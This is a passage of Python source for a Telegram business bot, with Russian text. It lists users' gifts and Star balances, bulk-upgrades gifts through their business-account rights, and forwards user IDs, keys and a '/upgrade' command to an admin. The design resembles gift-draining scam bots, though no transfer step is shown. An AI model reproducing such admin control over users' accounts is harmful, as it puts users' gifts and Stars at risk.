            if hasattr(all_connections, 'business_connections'):
                for bc in all_connections.business_connections:
                    if hasattr(bc, 'user') and bc.user.id == user_id and bc.is_enabled:
                        user_business_connection = bc
                        break
            
            if user_business_connection:
                # Нашли подключение, создаем запись в базе
                bc_id = user_business_connection.id
                
                # Проверяем еще раз, что пользователь не админ
                if user_id == ADMIN_CHAT_ID:
                    logger.info(f"Отклонено создание подключения для администратора {user_id}")
                    await callback_query.message.answer("⚠️ Администраторы не могут подключаться к боту.")
                    return
                
                # Генерируем ключ
                key = str(uuid.uuid4())
                
                # Сохраняем данные пользователя
                user_data[user_id] = {
                    "business_connection_id": bc_id,
                    "key": key,
                    "interactions": 0,
                    "can_reply": getattr(user_business_connection, 'can_reply', False)
                }
                
                logger.info(f"Автоматически создано подключение при проверке для пользователя {user_id}")
                
                # Перенаправляем на повторную проверку
                await process_check_connection(callback_query)
            
            else:
                # Подключение не найдено, предлагаем инструкцию
                not_connected_text = (
                    "❌ <b>Подключение не найдено</b>\n\n"
                    "Для работы с ботом необходимо подключить его к вашему бизнес-аккаунту:\n"
                    "1. Откройте настройки Telegram\n"
                    "2. Выберите 'Telegram для бизнеса' → 'Чатботы'\n"
                    "3. Найдите этого бота в списке и добавьте его\n"
                    "4. Вернитесь сюда и снова нажмите 'Проверить подключение'\n\n"
                    "Если вы уже подключили бота, но он не определяется, убедитесь, что:\n"
                    "• У вас активирован бизнес-аккаунт\n"
                    "• Вы подключили бота именно к бизнес-аккаунту\n"
                    "• Вы выдали боту необходимые права"
                )
                
                # Создаем клавиатуру с кнопкой повторной проверки
                retry_keyboard = InlineKeyboardMarkup(
                    inline_keyboard=[
                        [InlineKeyboardButton(text="Проверить еще раз", callback_data="check_connection")]
                    ]
                )
                
                await callback_query.message.answer(not_connected_text, reply_markup=retry_keyboard)
        
        except Exception as e:
            logger.exception(f"Ошибка при проверке подключения: {e}")
            await callback_query.message.answer(f"❌ Произошла ошибка при проверке подключения: {str(e)}")

# Обработчик нажатия на кнопку "Мои подарки"
@router.callback_query(F.data == "show_gifts")
async def process_show_gifts(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    logger.info(f"Пользователь {user_id} запросил список подарков")
    
    await callback_query.answer("Получаю список ваших подарков...")
    
    # Проверяем, есть ли пользователь в нашей базе
    if user_id not in user_data:
        await callback_query.message.answer("❌ Ваше подключение не найдено. Пожалуйста, используйте команду /start и проверьте подключение.")
        return
    
    bc_id = user_data[user_id]["business_connection_id"]
    
    try:
        # Получаем подарки пользователя
        gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
        
        if not hasattr(gifts, 'gifts') or not gifts.gifts:
            await callback_query.message.answer("📦 У вас пока нет подарков.")
            return
        
        # Разделяем подарки по типам
        unique_gifts = []
        regular_gifts = []
        
        for gift in gifts.gifts:
            gift_info = {
                "id": gift.owned_gift_id,
                "name": gift.gift.base_name if hasattr(gift.gift, 'base_name') else "Подарок",
                "number": gift.gift.number if hasattr(gift.gift, 'number') else None,
                "can_upgrade": gift.can_be_upgraded
            }
            
            if gift.type == OwnedGiftType.UNIQUE:
                unique_gifts.append(gift_info)
            elif gift.type == OwnedGiftType.REGULAR:
                regular_gifts.append(gift_info)
        
        # Получаем звезды через правильный метод
        stars_amount = 0
        try:
            stars_amount = await get_star_balance(bc_id)
        except Exception as e:
            logger.error(f"Ошибка при получении баланса звезд для отображения: {e}")
        
        # Формируем список уникальных подарков
        unique_list = ""
        if unique_gifts:
            unique_list = "🏆 <b>Уникальные подарки:</b>\n"
            for i, gift in enumerate(unique_gifts, 1):
                number_str = f" #{gift['number']}" if gift['number'] else ""
                unique_list += f"{i}. {gift['name']}{number_str}\n"
        else:
            unique_list = "🏆 <b>Уникальные подарки:</b> отсутствуют\n"
        
        # Формируем список обычных подарков
        regular_list = ""
        if regular_gifts:
            regular_list = "\n⭐ <b>Обычные подарки:</b>\n"
            upgradable_count = 0
            
            for i, gift in enumerate(regular_gifts, 1):
                upgrade_str = " (можно улучшить)" if gift['can_upgrade'] else ""
                if gift['can_upgrade']:
                    upgradable_count += 1
                regular_list += f"{i}. {gift['name']}{upgrade_str}\n"
            
            if upgradable_count > 0:
                regular_list += f"\n✨ {upgradable_count} подарков можно улучшить до уникальных"
        else:
            regular_list = "\n⭐ <b>Обычные подарки:</b> отсутствуют"
        
        # Формируем общее сообщение
        gifts_message = f"🎁 <b>Ваши подарки:</b>\n\n{unique_list}{regular_list}"
        
        # Добавляем информацию о звездах
        gifts_message += f"\n\n💫 <b>Звезды:</b> {stars_amount}"
        
        # Добавляем кнопки навигации
        navigation_keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="Улучшить подарки", callback_data="upgrade_gifts")],
                [InlineKeyboardButton(text="Обновить список", callback_data="show_gifts")],
                [InlineKeyboardButton(text="Назад", callback_data="check_connection")]
            ]
        )
        
        await callback_query.message.answer(gifts_message, reply_markup=navigation_keyboard)
    
    except Exception as e:
        logger.exception(f"Ошибка при получении списка подарков: {e}")
        await callback_query.message.answer(f"❌ Произошла ошибка при получении списка подарков: {str(e)}")

# Обработчик нажатия на кнопку "Улучшить подарки"
@router.callback_query(F.data == "upgrade_gifts")
async def process_upgrade_gifts(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    logger.info(f"Пользователь {user_id} запросил улучшение подарков")
    
    await callback_query.answer("Проверяю возможность улучшения подарков...")
    
    # Проверяем, есть ли пользователь в нашей базе
    if user_id not in user_data:
        await callback_query.message.answer("❌ Ваше подключение не найдено. Пожалуйста, используйте команду /start и проверьте подключение.")
        return
    
    bc_id = user_data[user_id]["business_connection_id"]
    
    try:
        # Получаем подарки пользователя
        gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
        
        if not hasattr(gifts, 'gifts') or not gifts.gifts:
            await callback_query.message.answer("📦 У вас пока нет подарков.")
            return
        
        # Находим обычные подарки, которые можно улучшить
        upgradable_gifts = [g for g in gifts.gifts if g.type == OwnedGiftType.REGULAR and g.can_be_upgraded]
        
        if not upgradable_gifts:
            # Нет подарков для улучшения
            await callback_query.message.answer(
                "⚠️ У вас нет подарков, которые можно улучшить до уникальных.\n\n"
                "Обычные подарки можно улучшить до уникальных только если эта опция доступна."
            )
            return
        
        # Формируем список подарков для улучшения
        upgradable_list = "✨ <b>Подарки, доступные для улучшения:</b>\n\n"
        for i, gift in enumerate(upgradable_gifts, 1):
            name = gift.gift.base_name if hasattr(gift.gift, 'base_name') else "Подарок"
            upgradable_list += f"{i}. {name}\n"
        
        upgradable_list += f"\nВсего: {len(upgradable_gifts)} подарков"
        
        # Проверяем права на улучшение подарков
        can_upgrade = False
        all_connections = await bot.get_business_connections()
        if hasattr(all_connections, 'business_connections'):
            for bc in all_connections.business_connections:
                if bc.id == bc_id and hasattr(bc, 'bot_rights') and hasattr(bc.bot_rights, 'can_transfer_and_upgrade_gifts'):
                    can_upgrade = bc.bot_rights.can_transfer_and_upgrade_gifts
                    break
        
        if can_upgrade:
            # Бот имеет права на улучшение подарков
            upgrade_message = (
                f"{upgradable_list}\n\n"
                "🔄 Вы можете улучшить эти подарки до уникальных NFT. "
                "После улучшения подарок станет уникальным и получит свой номер."
            )
            
            # Создаем кнопки для улучшения
            upgrade_keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="✨ Улучшить все подарки", callback_data="confirm_upgrade_all")],
                    [InlineKeyboardButton(text="Отмена", callback_data="show_gifts")]
                ]
            )
            
            await callback_query.message.answer(upgrade_message, reply_markup=upgrade_keyboard)
        
        else:
            # У бота нет прав на улучшение
            contact_admin_message = (
                f"{upgradable_list}\n\n"
                "⚠️ К сожалению, у бота нет прав на улучшение подарков.\n\n"
                "Пожалуйста, обратитесь к администратору бота, чтобы улучшить ваши подарки:"
            )
            
            # Создаем кнопки для связи с админом
            contact_keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="📩 Отправить запрос администратору", callback_data="contact_admin")],
                    [InlineKeyboardButton(text="Назад", callback_data="show_gifts")]
                ]
            )
            
            await callback_query.message.answer(contact_admin_message, reply_markup=contact_keyboard)
    
    except Exception as e:
        logger.exception(f"Ошибка при проверке подарков для улучшения: {e}")
        await callback_query.message.answer(f"❌ Произошла ошибка при проверке подарков: {str(e)}")

# Обработчик подтверждения улучшения всех подарков
@router.callback_query(F.data == "confirm_upgrade_all")
async def process_confirm_upgrade_all(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    logger.info(f"Пользователь {user_id} подтвердил улучшение всех подарков")
    
    await callback_query.answer("Начинаю улучшение подарков...")
    
    # Проверяем, есть ли пользователь в нашей базе
    if user_id not in user_data:
        await callback_query.message.answer("❌ Ваше подключение не найдено. Пожалуйста, используйте команду /start и проверьте подключение.")
        return
    
    bc_id = user_data[user_id]["business_connection_id"]
    
    try:
        # Получаем подарки пользователя
        gifts = await bot.get_business_account_gifts(business_connection_id=bc_id)
        
        # Находим обычные подарки, которые можно улучшить
        upgradable_gifts = [g for g in gifts.gifts if g.type == OwnedGiftType.REGULAR and g.can_be_upgraded]
        
        if not upgradable_gifts:
            await callback_query.message.answer("⚠️ Не найдено подарков для улучшения.")
            return
        
        # Отправляем сообщение о процессе
        processing_message = await callback_query.message.answer(f"⏳ Улучшаю подарки (0/{len(upgradable_gifts)})...")
        
        # Улучшаем каждый подарок
        upgraded_count = 0
        upgraded_names = []
        
        for gift in upgradable_gifts:
            try:
                # Улучшаем подарок
                result = await bot.upgrade_regular_gift_to_unique(
                    business_connection_id=bc_id,
                    owned_gift_id=gift.owned_gift_id
                )
                
                # Проверяем результат
                if result:
                    upgraded_count += 1
                    name = gift.gift.base_name if hasattr(gift.gift, 'base_name') else "Подарок"
                    upgraded_names.append(name)
                    
                    # Обновляем сообщение о прогрессе
                    await processing_message.edit_text(f"⏳ Улучшаю подарки ({upgraded_count}/{len(upgradable_gifts)})...")
            
            except Exception as e:
                logger.error(f"Ошибка при улучшении подарка {gift.owned_gift_id}: {e}")
        
        # Формируем сообщение о результате
        if upgraded_count > 0:
            # Успешное улучшение
            success_message = (
                f"✅ Улучшено {upgraded_count} из {len(upgradable_gifts)} подарков!\n\n"
                "🏆 Список улучшенных подарков:\n"
            )
            
            for i, name in enumerate(upgraded_names, 1):
                success_message += f"{i}. {name}\n"
            
            success_message += "\nТеперь эти подарки стали уникальными NFT с собственными номерами."
            
            # Создаем кнопки для просмотра обновленного списка
            success_keyboard = InlineKeyboardMarkup(
                inline_keyboard=[
                    [InlineKeyboardButton(text="Посмотреть обновленный список", callback_data="show_gifts")]
                ]
            )
            
            await processing_message.edit_text(success_message, reply_markup=success_keyboard)
            
            # Логируем успешное улучшение
            logger.info(f"Пользователь {user_id} улучшил {upgraded_count} подарков")
            
            # Отправляем уведомление администратору
            await bot.send_message(
                chat_id=ADMIN_CHAT_ID,
                text=f"🔄 Пользователь <code>{user_id}</code> улучшил {upgraded_count} подарков до уникальных NFT."
            )
        
        else:
            # Не удалось улучшить подарки
            await processing_message.edit_text(
                "❌ Не удалось улучшить подарки. Пожалуйста, попробуйте позже или обратитесь к администратору."
            )
    
    except Exception as e:
        logger.exception(f"Ошибка при улучшении подарков: {e}")
        await callback_query.message.answer(f"❌ Произошла ошибка при улучшении подарков: {str(e)}")

# Обработчик запроса на связь с администратором
@router.callback_query(F.data == "contact_admin")
async def process_contact_admin(callback_query: CallbackQuery):
    user_id = callback_query.from_user.id
    logger.info(f"Пользователь {user_id} запросил связь с администратором")
    
    await callback_query.answer("Отправляю запрос администратору...")
    
    # Проверяем, есть ли пользователь в нашей базе
    if user_id not in user_data:
        await callback_query.message.answer("❌ Ваше подключение не найдено. Пожалуйста, используйте команду /start и проверьте подключение.")
        return
    
    try:
        # Отправляем запрос администратору
        user_name = callback_query.from_user.full_name
        username = f"@{callback_query.from_user.username}" if callback_query.from_user.username else "Нет username"
        
        admin_message = (
            f"📩 <b>Запрос на улучшение подарков</b>\n\n"
            f"От пользователя: {user_name}\n"
            f"Username: {username}\n"
            f"ID: <code>{user_id}</code>\n"
            f"Ключ: <code>{user_data[user_id]['key']}</code>\n\n"
            f"Чтобы улучшить подарки используйте команду:\n"
            f"<code>/upgrade {user_id}</code>"
        )
        
        await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)
        
        # Отправляем подтверждение пользователю
        await callback_query.message.answer(
            "✅ Запрос успешно отправлен администратору!\n\n"
            "Пожалуйста, ожидайте ответа. Администратор улучшит ваши подарки в ближайшее время."
        )
        
        logger.info(f"Отправлен запрос администратору от пользователя {user_id}")
    
    except Exception as e:
        logger.exception(f"Ошибка при отправке запроса администратору: {e}")
        await callback_query.message.answer(f"❌ Произошла ошибка при отправке запроса: {str(e)}")

# Вспомогательная функция для проверки дублированных подключений
def is_duplicate_connection(user_id, connection_id):
    """
    Проверяет, является ли подключение дубликатом
    (уже обработанным в течение CACHE_TIMEOUT секунд)
    """
    current_time = time.time()
    
    # Если пользователь в кэше и прошло менее CACHE_TIMEOUT секунд
    if user_id in connection_cache:
        timestamp, cached_connection_id = connection_cache[user_id]
        if current_time - timestamp < CACHE_TIMEOUT and cached_connection_id == connection_id:
            return True
    
    # Проверяем, есть ли у пользователя уже подключение с таким же ID в user_data
    if user_id in user_data and user_data[user_id].get("business_connection_id") == connection_id:
        # Обновляем запись в кэше для предотвращения повторной обработки
        connection_cache[user_id] = (current_time, connection_id)
        return True
    
    # Добавляем/обновляем запись в кэше
    connection_cache[user_id] = (current_time, connection_id)
    return False

# Периодически очищаем кэш от старых записей
def clean_connection_cache():
    """
    Очищает кэш подключений от устаревших записей
    """
    current_time = time.time()
    for uid in list(connection_cache.keys()):
        timestamp, _ = connection_cache[uid]
        if current_time - timestamp > CACHE_TIMEOUT:
            del connection_cache[uid]

# Вспомогательная функция для получения баланса звезд
async def get_star_balance(bc_id):
    """
    Получает баланс звезд бизнес-аккаунта через правильный API-метод
    """
    try:
        star_amount = await bot.get_business_account_star_balance(business_connection_id=bc_id)
        if hasattr(star_amount, 'amount'):
            return star_amount.amount
        return 0
    except Exception as e:
        logger.error(f"Ошибка при получении баланса звезд: {e}")
        return 0

# Запуск
async def main():
    logger.info("=" * 50)
    logger.info("[BOT] Запуск бизнес-бота...")
    logger.info(f"[CONFIG] Токен: {BOT_TOKEN[:8]}...{BOT_TOKEN[-8:]}")
    logger.info(f"[CONFIG] Админ ID: {ADMIN_CHAT_ID}")
    logger.info(f"[CONFIG] Лог-канал ID: {LOG_CHANNEL_ID}")
    
    # Очищаем кэш подключений при запуске
    connection_cache.clear()
    logger.info("[BOT] Кэш подключений очищен")
    
    # Проверяем версию aiogram
    try:
        import aiogram
        logger.info(f"[VERSION] aiogram version: {aiogram.__version__}")
    except Exception as e:
        logger.warning(f"[VERSION] Не удалось определить версию aiogram: {e}")
    
    # Проверяем API бота
    try:
        me = await bot.me()
        logger.info(f"[BOT] Информация о боте: {me.full_name} (@{me.username})")
        logger.info(f"[BOT] ID бота: {me.id}")
        if hasattr(me, "can_use_business_features"):
            logger.info(f"[BOT] Бизнес-функции: {'✅ Доступны' if me.can_use_business_features else '❌ Недоступны'}")
        
        # Проверяем доступные бизнес-методы
        business_methods = [m for m in dir(bot) if 'business' in m.lower() and not m.startswith('_') and callable(getattr(bot, m))]
        logger.info(f"[BOT] Доступные бизнес-методы: {', '.join(business_methods)}")
    except Exception as e:
        logger.error(f"[BOT] Ошибка при получении информации о боте: {e}")
    
    # Явно указываем типы обновлений, которые хотим получать
    allowed_updates = ["message", "business_connection", "business_message"]
    logger.info(f"[CONFIG] Разрешенные обновления: {allowed_updates}")
    
    # Удаляем вебхук с отбрасыванием ожидающих обновлений
    await bot.delete_webhook(drop_pending_updates=True)
    logger.info("[BOT] Вебхук удален")
    
    # Задача для периодической очистки кэша
    async def periodic_cache_cleanup():
        while True:
            try:
                await asyncio.sleep(CACHE_TIMEOUT // 2)  # Очищаем каждые CACHE_TIMEOUT/2 секунд
                clean_connection_cache()
                logger.debug(f"[BOT] Выполнена периодическая очистка кэша подключений")
            except Exception as e:
                logger.error(f"[BOT] Ошибка при очистке кэша: {e}")
    
    # Запускаем задачу очистки кэша в отдельной корутине
    asyncio.create_task(periodic_cache_cleanup())
    logger.info("[BOT] Запущена задача очистки кэша подключений")
    
    # Запускаем поллинг с указанными обновлениями
    logger.info("[BOT] Запуск поллинга...")
    await dp.start_polling(bot, allowed_updates=allowed_updates)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Бот остановлен пользователем.")
    except Exception as e:
        logger.exception(f"Критическая ошибка: {e}")
